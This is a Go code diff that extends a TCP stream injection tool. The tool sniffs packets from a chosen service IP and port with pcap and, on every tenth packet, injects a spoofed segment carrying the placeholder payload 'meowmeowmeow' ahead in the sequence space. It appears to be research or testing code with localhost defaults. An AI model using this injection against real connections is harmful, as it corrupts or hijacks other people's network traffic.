@@ -6,6 +6,7 @@ import (
 	"code.google.com/p/gopacket/layers"
 	"code.google.com/p/gopacket/pcap"
 	"flag"
+	"fmt"
 	"golang.org/x/net/ipv4"
 	"log"
 	"net"
@@ -14,12 +15,28 @@ import (
 var iface = flag.String("i", "lo", "Interface to get packets from")
 var filter = flag.String("f", "tcp", "BPF filter for pcap")
 var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
+var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
+var servicePort = flag.Int("e", 2666, "target TCP flows from this port")
 
+// used as keys into our dictionary of tracked flows
+// this is perhaps not has versatile because the fields in
+// TCPFlow and IPFlow are non-exportable
+type TCPIPFlow struct {
+	TCPFlow gopacket.Flow
+	IPFlow  gopacket.Flow
+}
+
+// used by TCPStreamInjector below
 type TCPFlowID struct {
 	SrcIP   net.IP
 	SrcPort layers.TCPPort
 	DstIP   net.IP
 	DstPort layers.TCPPort
+}
+
+func (f *TCPIPFlow) Set(ip layers.IPv4, tcp layers.TCP) {
+	f.TCPFlow = tcp.TransportFlow()
+	f.IPFlow = ip.NetworkFlow()
 }
 
 type TCPStreamInjector struct {
@@ -121,6 +138,23 @@ func main() {
 	var payload gopacket.Payload
 	decoded := make([]gopacket.LayerType, 0, 4)
 
+	// target/track all TCP flows from this TCP/IP service endpoint
+	trackedFlows := make(map[TCPIPFlow]int)
+	serviceIP := net.ParseIP(*serviceIPstr)
+	if serviceIP == nil {
+		panic(fmt.Sprintf("non-ip target: %q\n", serviceIPstr))
+	}
+	serviceIP = serviceIP.To4()
+	if serviceIP == nil {
+		panic(fmt.Sprintf("non-ipv4 target: %q\n", serviceIPstr))
+	}
+
+	streamInjector := TCPStreamInjector{}
+	err := streamInjector.Init("0.0.0.0")
+	if err != nil {
+		panic(err)
+	}
+
 	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal("error opening pcap handle: ", err)
@@ -128,14 +162,13 @@ func main() {
 	if err := handle.SetBPFFilter(*filter); err != nil {
 		log.Fatal("error setting BPF filter: ", err)
 	}
-
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
 		&eth, &dot1q, &ip4, &ip6, &ip6extensions, &tcp, &payload)
+	flow := TCPIPFlow{}
 
 	log.Print("collecting packets...\n")
 
 	for {
-
 		data, ci, err := handle.ZeroCopyReadPacketData()
 		if err != nil {
 			log.Printf("error getting packet: %v %s", err, ci)
@@ -147,37 +180,39 @@ func main() {
 			continue
 		}
 
-		// skip handshake
-		if !tcp.SYN {
+		if tcp.SrcPort == layers.TCPPort(*servicePort) && ip4.SrcIP.Equal(serviceIP) {
+			flow.Set(ip4, tcp)
+			_, isTracked := trackedFlows[flow]
+			if isTracked {
+				trackedFlows[flow] += 1
+			} else {
+				trackedFlows[flow] = 1
+			}
+		} else {
 			continue
 		}
 
-		streamInjector := TCPStreamInjector{}
-		err = streamInjector.Init("0.0.0.0")
-		if err != nil {
-			panic(err)
+		if trackedFlows[flow]%10 == 0 {
+
+			tcpFlowId := TCPFlowID{
+				SrcIP:   ip4.SrcIP,
+				DstIP:   ip4.DstIP,
+				SrcPort: tcp.SrcPort,
+				DstPort: tcp.DstPort,
+			}
+			streamInjector.SetFlow(&tcpFlowId)
+
+			streamInjector.SetNextSeq(tcp.Seq + uint32(len(payload)) + uint32(tcp.Window)/uint32(2))
+			err = streamInjector.PrepareIPLayer()
+			if err != nil {
+				panic(err)
+			}
+			err = streamInjector.Write([]byte("meowmeowmeow"))
+			if err != nil {
+				panic(err)
+			}
+			log.Print("packet sent!\n")
 		}
 
-		tcpFlowId := TCPFlowID{
-			SrcIP:   ip4.SrcIP,
-			DstIP:   ip4.DstIP,
-			SrcPort: tcp.SrcPort,
-			DstPort: tcp.DstPort,
-		}
-
-		streamInjector.SetNextSeq(tcp.Seq + uint32(len(payload)))
-		streamInjector.SetFlow(&tcpFlowId)
-		err = streamInjector.PrepareIPLayer()
-		if err != nil {
-			panic(err)
-		}
-
-		err = streamInjector.Write([]byte("meowmeowmeow"))
-		if err != nil {
-			panic(err)
-		}
-
-		log.Print("packet sent!\n")
-		// XXX end of send packet section
 	}
 }
